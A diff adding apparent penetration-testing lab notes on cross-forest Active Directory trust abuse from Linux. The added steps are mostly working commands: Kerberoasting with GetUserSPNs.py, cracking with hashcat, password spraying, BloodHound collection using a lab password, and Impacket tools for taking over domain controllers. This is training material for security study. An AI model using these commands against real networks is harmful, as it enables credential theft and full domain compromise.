@@ -111,3 +111,140 @@ Used during **user migrations** and **M&A** environments.
 **Result:** Full compromise of **multiple forests** via trust.
 
 ---
+
+
+## **Attacking Domain Trusts – Cross-Forest Trust Abuse (Linux Edition)**
+
+### 1️⃣ Cross-Forest Kerberoasting (Linux)
+
+**Enumerate SPNs in the foreign forest:**
+
+```bash
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+If you see something like:
+
+* `MSSQLsvc/sql01.freightlogstics:1433  ->  mssqlsvc (Domain Admins)`
+  then it’s *perfect* roast material.
+
+**Request TGS + dump hash:**
+
+```bash
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+# optionally:
+# GetUserSPNs.py -request -outputfile mssqlsvc_tgs.txt -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+**Crack with Hashcat (Kerberoast RC4, mode 13100):**
+
+```bash
+hashcat -m 13100 mssqlsvc_tgs.txt /usr/share/wordlists/rockyou.txt
+```
+
+If cracked → **log in as `FREIGHTLOGISTICS\mssqlsvc` (Domain Admin)**.
+Then:
+
+* Check for **password reuse** back in `INLANEFREIGHT` (same username or similarly named service accounts).
+* Consider a **single, careful password spray** with that password on other service accounts.
+
+---
+
+### 2️⃣ Set Up DNS for BloodHound-Python (Per-Domain)
+
+If you’re not on internal DNS by default, update `/etc/resolv.conf` before running `bloodhound-python`.
+
+**For INLANEFREIGHT.LOCAL:**
+
+```bash
+sudo nano /etc/resolv.conf
+
+# Example contents:
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+**Run bloodhound-python (Domain 1):**
+
+```bash
+bloodhound-python \
+  -d INLANEFREIGHT.LOCAL \
+  -dc ACADEMY-EA-DC01 \
+  -c All \
+  -u forend \
+  -p Klmcargo2
+```
+
+Zip the JSONs:
+
+```bash
+zip -r inlanefreight_bh.zip *.json
+```
+
+→ Upload into BloodHound GUI.
+
+---
+
+### 3️⃣ Repeat for the Partner Forest
+
+**For FREIGHTLOGISTICS.LOCAL:**
+
+```bash
+sudo nano /etc/resolv.conf
+
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+**Run bloodhound-python (Domain 2):**
+
+```bash
+bloodhound-python \
+  -d FREIGHTLOGISTICS.LOCAL \
+  -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
+  -c All \
+  -u forend@inlanefreight.local \
+  -p Klmcargo2
+```
+
+Zip and upload:
+
+```bash
+zip -r freightlogistics_bh.zip *.json
+```
+
+---
+
+### 4️⃣ Find Foreign Admins in BloodHound
+
+In the BloodHound GUI:
+
+* In **Analysis → Pre-Built Queries**
+  choose **“Users with Foreign Domain Group Membership”**
+* Set **source domain** to `INLANEFREIGHT.LOCAL`
+
+Example finding:
+
+* `INLANEFREIGHT\administrator` → member of `FREIGHTLOGISTICS.LOCAL\Administrators`
+
+That means:
+
+* Popping `INLANEFREIGHT\administrator` = **instant admin in FREIGHTLOGISTICS.LOCAL**, too.
+
+---
+
+### 5️⃣ Cross-Forest Abuse – Mental Model Recap
+
+From Linux, cross-forest game plan:
+
+1. **Kerberoast across trust** with `GetUserSPNs.py`.
+2. **Crack TGS hash** with `hashcat -m 13100`.
+3. Check **password reuse** across domains, especially for admins/service accounts.
+4. Use **bloodhound-python** in *both* forests, feed into BloodHound.
+5. Hunt:
+
+   * Foreign group membership (e.g., admins from Forest A in Builtin\Administrators of Forest B).
+   * High-value SPNs in other forests.
+6. Use resulting creds with Impacket tools (`psexec.py`, `wmiexec.py`, `smbexec.py`) to own DCs across forests.
+
+
